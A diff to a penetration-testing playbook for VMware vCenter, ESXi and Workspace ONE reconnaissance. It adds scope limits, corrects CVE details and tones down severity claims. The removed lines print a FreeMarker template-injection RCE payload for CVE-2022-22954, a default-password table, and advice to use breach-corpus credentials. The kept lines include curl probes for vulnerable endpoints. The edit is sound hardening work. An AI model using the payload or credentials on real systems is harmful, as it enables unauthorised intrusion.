@@ -46,6 +46,10 @@ Do NOT use for:
 
 ---
 
+## Evidence and scope
+
+The matrix is historical research, not a current patch inventory; verify exact builds/mitigations in the vendor advisory before asserting applicability. Product-family names and TLS SANs are clues, not proof. Preserve the external-only scope here; newly discovered internal hosts or federated identity providers need separate permission. Queries returning configuration or inventory require data-access scope; do not download VM disks/snapshots or mint tokens merely to increase impact. Read-only HTTP probes can still be logged or rate-limited. Linked tools/helpers and claimed test evidence are not bundled.
+
 ## Step 1 — Version fingerprinting
 
 ```bash
@@ -78,12 +82,12 @@ Map build → version → CVE applicability via VMware advisories (vmware.com/se
 | CVE | Affected | Vector | Status |
 |---|---|---|---|
 | **CVE-2024-37085** | ESXi 7.0/8.0 < specific patch | AD group "ESX Admins" auto-admin bypass | High — Domain takeover→ESXi RCE, exploited in ransomware ops |
-| **CVE-2024-22273** | ESXi/Workstation/Fusion/vCenter storage controller | OOB read/write — requires VM-local access (NOT a pre-auth network SSRF; see Section 9) | Important (CVSS 8.1), not external pre-auth |
+| **CVE-2024-22273** | ESXi/Workstation/Fusion storage controller | OOB read/write — requires VM-local access (NOT a pre-auth network SSRF; see Section 9) | Important (CVSS 8.1), not external pre-auth |
 | **CVE-2024-22252/53** | Workstation/Fusion (not vCenter) | Sandbox escape | Not external |
 | **CVE-2023-34048** | vCenter 7/8 < specific build | DCE/RPC pre-auth heap OOB write → RCE | Critical, patched 2023-10 |
 | **CVE-2023-20887** | Aria Operations for Networks | Pre-auth command injection → RCE | Critical |
 | **CVE-2023-20892** | vCenter 7/8 | Use-after-free in DCE/RPC | High |
-| **CVE-2022-31656/31659** | Workspace ONE Access 21.x | Pre-auth SSRF + auth bypass | Critical chained |
+| **CVE-2022-31656/31659** | Workspace ONE Access 21.x | Authentication bypass (31656) + authenticated command injection (31659) | Critical chained |
 | **CVE-2022-22954** | Workspace ONE Access | Pre-auth server-side template injection (SSTI) → RCE | Critical, widely exploited |
 | **CVE-2021-22005** | vCenter 6.7/7.0 < build | Analytics service pre-auth file upload → RCE | Critical |
 | **CVE-2021-21985** | vCenter 6.5/6.7/7.0 < build | vSAN Health Check plugin pre-auth RCE | Critical |
@@ -99,9 +103,8 @@ Map build → version → CVE applicability via VMware advisories (vmware.com/se
 # Detection only — DO NOT execute the file upload without explicit scope OK
 curl -sk -o /dev/null -w "%{http_code}\n" \
   "https://$TARGET/ui/vropspluginui/rest/services/uploadova"
-# 405 → endpoint exists, version vulnerable
-# 404 → patched (endpoint removed)
-# 401 → patched (auth required)
+# 405/404/401 are routing/auth observations, not proof of patch state.
+# Match exact vendor product/build and mitigations; proxies can change responses.
 
 curl -sk -o /dev/null -w "%{http_code}\n" \
   "https://$TARGET/ui/vropspluginui/rest/services/getstatus"
@@ -120,30 +123,18 @@ curl -sk -o /tmp/wone_baseline.txt -w "%{http_code}\n" \
 # 4xx with FreeMarker/catalog-portal error template → endpoint present, candidate vulnerable.
 # 404 → patched/removed. Keep the baseline body to diff against Stage B.
 
-# Stage B — execution (ONLY with explicit RCE-attempt sign-off): emit a unique canary
-# so a coincidental WAF/error page containing "uid=" cannot be mistaken for real output.
-CANARY="VCTR$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')"
-curl -sk "https://$TARGET/catalog-portal/ui/oauth/verify?error=&deviceUdid=\${\"freemarker.template.utility.Execution\"?new()(\"echo ${CANARY}; id\")}"
-# Confirmed RCE ONLY if the response contains the exact $CANARY echoed back AND "uid=" output
-# that is absent from /tmp/wone_baseline.txt (in-band command output, body-diff against baseline).
+# Any execution-stage proof requires a separately approved plan and exact
+# affected product/build. The imported shell URL was malformed/typoed and is
+# deliberately omitted; do not convert a copied template directly into an RCE run.
 ```
 
-Confirmed RCE requires the unique `$CANARY` reflected in-band plus `uid=` output not present in the Stage-A baseline → critical. Stop and report. A bare `uid=` with no canary echo is NOT confirmation.
+A reflected canary plus `uid=` text is not by itself proof of execution; rule out input reflection with controlled expression/output differences. Prefer a harmless lab canary, record exact output and stop when the authorized evidence is sufficient.
 
 ---
 
-## Step 5 — Default credentials (frequently still valid on lab/staging vCenters)
+## Step 5 — Authentication boundary
 
-| Product | Default user | Default password |
-|---|---|---|
-| vCenter 6.x | `administrator@vsphere.local` | `<set-during-install>` |
-| vCenter Appliance root | `root` | `vmware` (legacy) or `<set>` |
-| ESXi root | `root` | `<blank>` or `vmware` |
-| vCenter Server Appliance Mgmt (5480) | `root` | `<set-during-install>` |
-| Aria Operations | `admin` | `vmware` (legacy) |
-| Workspace ONE | `admin` | `<set>` |
-
-⚠ **Do not spray vCenter — `administrator@vsphere.local` has VERY low lockout threshold** (often 3 attempts → 60s lockout, configurable to permanent). One attempt with high-confidence guess only. Use creds discovered in breach corpora.
+There is no universal default-password table for these products/versions. Installation and lockout policies vary. Do not use breach-corpus credentials or password spray. Test only an explicitly approved owned account with the agreed attempt limit and stop at lockout/rate-limit indicators; otherwise request a least-privilege assessment account.
 
 ---
 
@@ -168,7 +159,7 @@ ldapsearch -x -H "ldap://$TARGET:389" -b "cn=Configuration,cn=vmware,cn=cis,dc=v
 ```bash
 curl -skI "https://$TARGET/mob"
 # 401 → auth required (good for the defender)
-# 200 → MOB exposed → can browse VMs, hosts, datastores, sessions without credentials in some misconfigs
+# 200 is only a responding page; verify whether protected synthetic inventory is actually accessible without authentication before claiming disclosure.
 
 # Auth'd MOB lets you walk the entire vSphere tree:
 curl -sk -u 'administrator@vsphere.local:<pw>' "https://$TARGET/mob/?moid=ServiceInstance&doPath=content"
@@ -362,9 +353,9 @@ These are the load-bearing public references for every CVE called out in the mat
 - **Disclosure:** Reported by Microsoft Threat Intelligence; advisory VMSA-2024-0013 published 2024-06-25. **Microsoft Security Blog** documents pre-patch exploitation by **Storm-0506 (Black Basta), Storm-1175, Octo Tempest, and Manatee Tempest** ransomware operators — including a confirmed Black Basta deployment at a North American engineering firm. **CISA KEV:** added 2024-07-30. Year discovered 2024 (exploited as 0-day), patched 2024.
 - **References:** https://www.vmware.com/security/advisories/VMSA-2024-0013.html ; https://www.microsoft.com/en-us/security/blog/2024/07/29/ransomware-operators-exploit-esxi-hypervisor-vulnerability-for-mass-encryption/ ; https://www.rapid7.com/blog/post/2024/07/30/vmware-esxi-cve-2024-37085-targeted-in-ransomware-campaigns/ ; https://thehackernews.com/2024/07/vmware-esxi-flaw-exploited-by.html
 
-### 9. CVE-2024-22273 — ESXi / Workstation / Fusion / vCenter storage controller OOB read/write
-- **Note on the original ticket:** This CVE was listed in the brief as "Aria SSRF," but the actual NVD record describes an **ESXi/vCenter storage controller out-of-bounds read/write**, not an Aria SSRF. The closest Aria SSRF-adjacent issue in the 2024 cycle is **CVE-2023-34063** (VMSA-2024-0001) — Aria Automation missing access control allowing authenticated cross-org access; CVSSv3 9.9. Both are cited so the matrix is technically accurate.
-- **Affected (CVE-2024-22273):** ESXi 7.0/8.0, Workstation 17.x, Fusion 13.x. vCenter Server packaged variants. Requires VM-local access with storage controllers enabled.
+### 9. CVE-2024-22273 — ESXi / Workstation / Fusion storage controller OOB read/write
+- **Note on the original ticket:** This CVE was listed in the brief as "Aria SSRF," but the actual NVD record describes an **ESXi/Workstation/Fusion storage-controller out-of-bounds read/write**, not an Aria SSRF. The closest Aria SSRF-adjacent issue in the 2024 cycle is **CVE-2023-34063** (VMSA-2024-0001) — Aria Automation missing access control allowing authenticated cross-org access; CVSSv3 9.9. Both are cited so the matrix is technically accurate.
+- **Affected (CVE-2024-22273):** ESXi 7.0/8.0, Workstation 17.x, Fusion 13.x. The vCenter issues in the same advisory are separate CVEs 22274/22275. Requires VM-local access with storage controllers enabled.
 - **Attack flow:** VM with storage controllers enabled can issue crafted I/O to trigger OOB read/write on the host → information disclosure or DoS of the host (escape not directly demonstrated). CVSS 8.1 (Important).
 - **Root cause:** Missing bounds check in the storage controller emulation path.
 - **Disclosure:** Reported by Hao Zheng (@zhz) and Jiaqing Huang (@s0duku) of TianGong Team, Legendsec @ Qi'anxin Group. Advisory VMSA-2024-0011 published 2024-05-21. Year discovered 2024, patched 2024.
@@ -394,7 +385,7 @@ These are the load-bearing public references for every CVE called out in the mat
 - **ZDI published advisories:** https://www.zerodayinitiative.com/advisories/published/ — filter "VMware" for the canonical paid-bounty disclosures (CVE-2020-3992, CVE-2023-34048, multiple Aria Operations and vRNI).
 - **Mandiant UNC3886 reporting:** Google Cloud Threat Intelligence has the deepest published forensic trail on long-tail vCenter zero-day exploitation. Pair with the `mid-engagement-ir-detection` skill when working a target where vCenter is reachable.
 
-The pattern across every entry above: **VMware management-plane CVEs are pre-auth, network-reachable, and mass-exploited within days of patch.** When external recon surfaces any of these products at a current-minus-one patch level, that is a Critical finding worth a same-day callout in the deliverable — not a Medium info-disclosure.
+These CVEs have different products, privileges and prerequisites; not all are pre-auth network issues. A current-minus-one version alone does not establish exposure or severity. Match exact advisory response matrices and observed configuration, then apply the engagement rubric.
 
 ## Limitations
 
